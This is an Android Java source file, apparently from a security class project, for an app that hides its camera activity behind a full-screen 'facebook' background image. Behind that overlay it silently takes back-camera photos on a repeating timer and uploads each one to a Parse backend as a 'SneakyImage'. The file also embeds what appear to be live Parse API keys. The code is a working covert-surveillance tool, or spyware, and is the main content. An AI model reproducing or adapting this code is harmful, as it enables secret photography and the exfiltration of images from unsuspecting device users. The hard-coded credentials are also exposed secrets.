package com.example.markassad.secproj2;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Bundle;
import android.app.Activity;
import android.os.Handler;
import android.os.Message;
import android.view.Menu;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageView;
import com.parse.Parse;
import com.parse.ParseFile;
import com.parse.ParseObject;
import java.io.ByteArrayOutputStream;

public class MainActivity extends Activity implements SurfaceHolder.Callback {

    public static final int COMPLETE =1;
    public static final int RESTART =2;
    public static final int WAIT = 5000;

    private Camera backCam;
    private SurfaceHolder surfaceHolder;
    private Button peepButton;
    private SurfaceView surfaceView;
    private Timer timer;
    private ImageView overlayingImage;

    //When the app is first created, get access to the UI elements, and listen to the peep button press event
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Parse.enableLocalDatastore(this);
        Parse.initialize(this, "gyE3e4B8dXb1NM5KxYayv065wIIi7zw1c2pe4LhN", "Ne26ezLNbJA5P0Ypa3ZgUcyURV1WKplFOWsw7CJq");

        surfaceView=(SurfaceView)findViewById(R.id.surfaceView);
        overlayingImage =(ImageView)findViewById(R.id.overlayImage);
        peepButton =(Button)findViewById(R.id.peepButton);
        surfaceHolder=surfaceView.getHolder();
        surfaceHolder.addCallback(this);

        //Whenever the peep button is pressed, access the camera and show the facebook display.
        peepButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                overlayingImage.setScaleType(ImageView.ScaleType.FIT_XY);
                overlayingImage.setImageResource(R.drawable.background);
                accessCamera();
            }
        });

    }

    //Accesses the back camera by binding it to the surface view.
    public void accessCamera(){

        try {
            backCam =Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            backCam.setPreviewDisplay(surfaceHolder);
            backCam.startPreview();
            Camera.Parameters params = backCam.getParameters();
            params.setJpegQuality(100);
            backCam.setParameters(params);
        } catch (Exception e){
            e.printStackTrace();
        }

        //Start a timer to periodically take pictures in the background
        timer=new Timer(backgroundThread);
        timer.execute();

    }

    //Get the data from the camera, transform them into a Bitmap and upload to backend.
    Camera.PictureCallback cameraData = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            Bitmap bitmapPicture = BitmapFactory.decodeByteArray(data, 0, data.length);
            uploadToBackEnd(bitmapPicture);
            Message.obtain(backgroundThread, MainActivity.RESTART, "").sendToTarget();
        }
    };

    //Handles the communications between the timer and the UI thread.
    private Handler backgroundThread = new Handler() {
        public void handleMessage(android.os.Message msg) {
            switch(msg.what){
                case RESTART:
                    timer=new Timer(backgroundThread);
                    timer.execute();
                    break;
                case COMPLETE:
                    backCam.takePicture(null, null, cameraData);
                    break;
            }
        }
    };

    //Uploads a picture to parse's backend
    public void uploadToBackEnd(Bitmap image) {

        ByteArrayOutputStream dataStream = new ByteArrayOutputStream();
        image.compress(Bitmap.CompressFormat.JPEG, 25, dataStream);
        byte[] imgArray = dataStream.toByteArray();

        ParseFile parseFile = new ParseFile(System.currentTimeMillis()+".jpg", imgArray);
        ParseObject testObject = new ParseObject("SneakyImage");
        testObject.put("image", parseFile);
        testObject.saveInBackground();

    }

    //Release the camera while exiting the app to avoid locking it by mistake.
    @Override
    protected void onPause() {

        if (timer!=null){
            timer.cancel(true);
        }

        if (backCam != null) {
            backCam.stopPreview();
            backCam.release();
            backCam = null;
        }

        super.onPause();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        return true;
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {

    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {

    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {

    }

}


